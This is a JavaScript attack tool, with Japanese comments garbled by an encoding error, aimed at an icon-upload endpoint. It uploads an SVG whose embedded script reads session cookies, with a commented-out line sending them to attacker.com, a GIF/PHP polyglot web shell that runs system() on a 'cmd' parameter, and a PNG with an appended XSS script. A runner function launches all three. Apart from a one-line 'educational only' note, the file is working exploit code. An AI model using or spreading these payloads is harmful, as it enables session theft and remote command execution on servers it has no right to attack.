/**
 * ã‚¢ã‚¤ã‚³ãƒ³ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ”»æ’ƒã‚¹ã‚¯ãƒªãƒ—ãƒˆ
 * 
 * ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ã‚¢ã‚¤ã‚³ãƒ³ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ©Ÿèƒ½ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦
 * æ‚ªæ„ã®ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚
 * 
 * ä½¿ç”¨æ–¹æ³•:
 * 1. ãƒ–ãƒ©ã‚¦ã‚¶ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§å®Ÿè¡Œ
 * 2. ã¾ãŸã¯ã€Node.jsç’°å¢ƒã§å®Ÿè¡Œï¼ˆfetch APIãŒå¿…è¦ï¼‰
 */

// XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€SVGãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰
async function uploadXSSPayload() {
    // SVGãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ï¼ˆXSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€ï¼‰
    const svgContent = `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" fill="red"/>
  <text x="50" y="55" text-anchor="middle" fill="white" font-size="20">XSS</text>
  <script type="text/javascript">
    alert('XSSæ”»æ’ƒæˆåŠŸï¼ã‚¢ã‚¤ã‚³ãƒ³ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¾ã—ãŸã€‚');
    console.log('Session:', document.cookie);
    // ã‚»ãƒƒã‚·ãƒ§ãƒ³æƒ…å ±ã‚’å¤–éƒ¨ã«é€ä¿¡ï¼ˆå®Ÿéš›ã®æ”»æ’ƒã§ã¯ï¼‰
    // fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
  </script>
</svg>`;

    // Blobã¨ã—ã¦ä½œæˆï¼ˆContent-Typeã‚’å½è£…ï¼‰
    const blob = new Blob([svgContent], { type: 'image/png' });
    const file = new File([blob], 'icon.png', { type: 'image/png' });

    const formData = new FormData();
    formData.append('icon', file);

    try {
        const response = await fetch('/api/upload-icon', {
            method: 'POST',
            body: formData,
            credentials: 'include'
        });

        const result = await response.json();
        console.log('ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰çµæœ:', result);
        
        if (result.success) {
            console.log('âœ… XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã«æˆåŠŸã—ã¾ã—ãŸï¼');
            console.log('ã‚¢ã‚¤ã‚³ãƒ³ãƒ‘ã‚¹:', result.iconPath);
            console.log('ã“ã®ã‚¢ã‚¤ã‚³ãƒ³ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¨ã€åŸ‹ã‚è¾¼ã¾ã‚ŒãŸã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚');
        } else {
            console.error('âŒ ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã«å¤±æ•—:', result.message);
        }
    } catch (error) {
        console.error('ã‚¨ãƒ©ãƒ¼:', error);
    }
}

// ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ï¼ˆGIFãƒ˜ãƒƒãƒ€ãƒ¼ + PHPã‚³ãƒ¼ãƒ‰ï¼‰
async function uploadPolyglotFile() {
    // GIFãƒã‚¸ãƒƒã‚¯ãƒŠãƒ³ãƒãƒ¼ï¼ˆGIF89aï¼‰ã§å§‹ã¾ã‚‹ãŒã€PHPã‚³ãƒ¼ãƒ‰ã‚‚å«ã‚€
    const polyglotContent = `GIF89a
<?php
// ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«: GIFã¨ã—ã¦ã‚‚æœ‰åŠ¹ã€PHPã¨ã—ã¦ã‚‚å®Ÿè¡Œå¯èƒ½
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
<!-- å®Ÿéš›ã®GIFãƒ‡ãƒ¼ã‚¿ã¯ã“ã“ã«ç¶šã -->`;

    const blob = new Blob([polyglotContent], { type: 'image/gif' });
    const file = new File([blob], 'icon.gif', { type: 'image/gif' });

    const formData = new FormData();
    formData.append('icon', file);

    try {
        const response = await fetch('/api/upload-icon', {
            method: 'POST',
            body: formData,
            credentials: 'include'
        });

        const result = await response.json();
        console.log('ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰çµæœ:', result);
        
        if (result.success) {
            console.log('âœ… ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã«æˆåŠŸã—ã¾ã—ãŸï¼');
            console.log('âš ï¸ æ³¨æ„: ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ç”»åƒã¨ã—ã¦è¡¨ç¤ºã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ãŒã€');
            console.log('   ã‚µãƒ¼ãƒãƒ¼ãŒPHPã¨ã—ã¦å®Ÿè¡Œã™ã‚‹å ´åˆã€åŸ‹ã‚è¾¼ã¾ã‚ŒãŸã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚');
        } else {
            console.error('âŒ ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã«å¤±æ•—:', result.message);
        }
    } catch (error) {
        console.error('ã‚¨ãƒ©ãƒ¼:', error);
    }
}

// å®Ÿéš›ã®PNGãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚“ã§ã€XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è¿½åŠ 
async function createPolyglotPNG() {
    // å®Ÿéš›ã®PNGãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒã‚¤ãƒŠãƒªãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—
    // ã“ã“ã§ã¯ä¾‹ã¨ã—ã¦ã€æ—¢å­˜ã®PNGãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€
    try {
        const response = await fetch('/icons/admin_1766252696691.png');
        const blob = await response.blob();
        const arrayBuffer = await blob.arrayBuffer();
        
        // PNGãƒ•ã‚¡ã‚¤ãƒ«ã®æœ«å°¾ã«XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è¿½åŠ 
        // å®Ÿéš›ã«ã¯ã€PNGãƒ•ã‚¡ã‚¤ãƒ«ã®æ§‹é€ ã‚’ç†è§£ã—ã¦é©åˆ‡ãªå ´æ‰€ã«åŸ‹ã‚è¾¼ã‚€å¿…è¦ãŒã‚ã‚‹
        const pngData = new Uint8Array(arrayBuffer);
        const xssPayload = new TextEncoder().encode('<script>alert("XSS")</script>');
        const combined = new Uint8Array(pngData.length + xssPayload.length);
        combined.set(pngData);
        combined.set(xssPayload, pngData.length);
        
        const file = new File([combined], 'icon.png', { type: 'image/png' });
        const formData = new FormData();
        formData.append('icon', file);

        const uploadResponse = await fetch('/api/upload-icon', {
            method: 'POST',
            body: formData,
            credentials: 'include'
        });

        const result = await uploadResponse.json();
        console.log('ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰çµæœ:', result);
    } catch (error) {
        console.error('ã‚¨ãƒ©ãƒ¼:', error);
    }
}

// ãƒ¡ã‚¤ãƒ³é–¢æ•°: ã™ã¹ã¦ã®æ”»æ’ƒã‚’è©¦è¡Œ
async function runAllAttacks() {
    console.log('ğŸš€ ã‚¢ã‚¤ã‚³ãƒ³ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ”»æ’ƒã‚’é–‹å§‹ã—ã¾ã™...\n');
    
    console.log('1. XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€SVGãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰...');
    await uploadXSSPayload();
    
    console.log('\n2. ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆGIF + PHPï¼‰ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰...');
    await uploadPolyglotFile();
    
    console.log('\n3. ãƒãƒªã‚°ãƒ­ãƒƒãƒˆPNGãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆ...');
    await createPolyglotPNG();
    
    console.log('\nâœ… ã™ã¹ã¦ã®æ”»æ’ƒãŒå®Œäº†ã—ã¾ã—ãŸã€‚');
    console.log('âš ï¸ æ³¨æ„: ã“ã‚Œã‚‰ã®æ”»æ’ƒã¯æ•™è‚²ç›®çš„ã®ã¿ã§ã™ã€‚');
}

// ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆï¼ˆNode.jsç’°å¢ƒã®å ´åˆï¼‰
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        uploadXSSPayload,
        uploadPolyglotFile,
        createPolyglotPNG,
        runAllAttacks
    };
}

// ãƒ–ãƒ©ã‚¦ã‚¶ç’°å¢ƒã§ç›´æ¥å®Ÿè¡Œå¯èƒ½ã«ã™ã‚‹
if (typeof window !== 'undefined') {
    window.uploadIconAttack = {
        uploadXSSPayload,
        uploadPolyglotFile,
        createPolyglotPNG,
        runAllAttacks
    };
    
    console.log('æ”»æ’ƒãƒ„ãƒ¼ãƒ«ãŒèª­ã¿è¾¼ã¾ã‚Œã¾ã—ãŸã€‚');
    console.log('ä½¿ç”¨æ–¹æ³•:');
    console.log('  uploadIconAttack.uploadXSSPayload() - XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰');
    console.log('  uploadIconAttack.uploadPolyglotFile() - ãƒãƒªã‚°ãƒ­ãƒƒãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰');
    console.log('  uploadIconAttack.runAllAttacks() - ã™ã¹ã¦ã®æ”»æ’ƒã‚’å®Ÿè¡Œ');
}


